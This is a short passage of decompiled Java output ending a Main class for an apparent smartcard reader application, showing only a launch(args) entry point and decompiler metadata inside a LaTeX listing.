/*    */   public static void main(String[] args)
/*    */   {
/* 61 */     launch(args);
/*    */   }
/*    */ }

/* Location:           /Volumes/MacintoshHD/Users/mep/Downloads/smartcard_reader_application.jar
 * Qualified Name:     de.next9bank.scs.Main
 * JD-Core Version:    0.6.2
 */
\end{lstlisting}